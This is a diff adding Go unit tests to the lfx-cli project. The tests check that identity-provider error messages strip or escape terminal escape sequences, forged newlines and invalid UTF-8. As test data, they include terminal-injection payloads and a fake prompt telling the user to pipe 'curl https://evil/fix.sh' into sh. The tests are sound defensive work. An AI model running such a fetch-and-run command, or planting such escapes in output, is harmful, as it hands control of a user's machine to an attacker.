@@ -9,9 +9,11 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"errors"
+	"net/http"
 	"strconv"
 	"strings"
 	"testing"
+	"unicode/utf8"
 
 	"github.com/linuxfoundation/lfx-cli/internal/credstore"
 	"github.com/urfave/cli/v3"
@@ -544,5 +546,77 @@ func TestResolveEnvironmentUnknown(t *testing.T) {
 	}
 	if !errors.Is(err, errInvalidEnvironment) {
 		t.Errorf("resolveEnvironment(\"bogus\") error = %v, want wrapping errInvalidEnvironment", err)
+	}
+}
+
+func TestIdPErrorDropsBodyWithoutErrorCode(t *testing.T) {
+	// With no `error` code, RetrieveError.Error() embeds the raw body after a
+	// newline, so a hostile response could clear the screen or forge lines.
+	err := idpError("refresh access token", &oauth2.RetrieveError{
+		Response: &http.Response{StatusCode: http.StatusInternalServerError, Status: "500 \x1b]0;title\x07"},
+		Body:     []byte("\x1b[2J\x1b[1;1HSession compromised.\nRun: curl https://evil/fix.sh | sh"),
+	})
+	got := err.Error()
+	if want := "refresh access token: identity provider returned HTTP 500"; got != want {
+		t.Errorf("idpError = %q, want %q", got, want)
+	}
+	if strings.ContainsAny(got, "\x1b\n") {
+		t.Errorf("idpError = %q, contains a raw ESC or newline", got)
+	}
+}
+
+func TestIdPErrorEscapesCodeAndDescription(t *testing.T) {
+	err := idpError("unexpected error waiting for login", &oauth2.RetrieveError{
+		Response:         &http.Response{StatusCode: http.StatusBadRequest},
+		ErrorCode:        "invalid_request",
+		ErrorDescription: "bad\nforged line\x1b[2J",
+	})
+	got := err.Error()
+	want := `unexpected error waiting for login: identity provider returned HTTP 400: invalid_request: "bad\nforged line\x1b[2J"`
+	if got != want {
+		t.Errorf("idpError = %q, want %q", got, want)
+	}
+}
+
+func TestIdPErrorTruncatesDescription(t *testing.T) {
+	// The cap lands inside the 2-byte "é", which must not be split.
+	desc := strings.Repeat("a", maxIDPErrorTextBytes-1) + "é" + strings.Repeat("b", 1000)
+	err := idpError("request device code", &oauth2.RetrieveError{
+		Response:         &http.Response{StatusCode: http.StatusBadRequest},
+		ErrorCode:        "invalid_request",
+		ErrorDescription: desc,
+	})
+	got := err.Error()
+	want := "request device code: identity provider returned HTTP 400: invalid_request: " + strings.Repeat("a", maxIDPErrorTextBytes-1)
+	if got != want {
+		t.Errorf("idpError = %q, want %q", got, want)
+	}
+	if !utf8.ValidString(got) {
+		t.Errorf("idpError = %q, not valid UTF-8", got)
+	}
+}
+
+func TestIdPErrorWrapsOtherErrors(t *testing.T) {
+	cause := errors.New("dial tcp: connection refused")
+	err := idpError("refresh access token", cause)
+	if !errors.Is(err, cause) {
+		t.Errorf("idpError(%v) does not wrap the cause", cause)
+	}
+	if want := "refresh access token: dial tcp: connection refused"; err.Error() != want {
+		t.Errorf("idpError = %q, want %q", err.Error(), want)
+	}
+}
+
+func TestIdPErrorEscapesInvalidUTF8(t *testing.T) {
+	// A form-encoded error response can carry %9B, an 8-bit CSI, which
+	// url.ParseQuery decodes to a raw byte that is not valid UTF-8.
+	err := idpError("refresh access token", &oauth2.RetrieveError{
+		Response:         &http.Response{StatusCode: http.StatusBadRequest},
+		ErrorCode:        "invalid_request",
+		ErrorDescription: "x\x9b2Jy",
+	})
+	got := err.Error()
+	if want := `refresh access token: identity provider returned HTTP 400: invalid_request: "x\x9b2Jy"`; got != want {
+		t.Errorf("idpError = %q, want %q", got, want)
 	}
 }
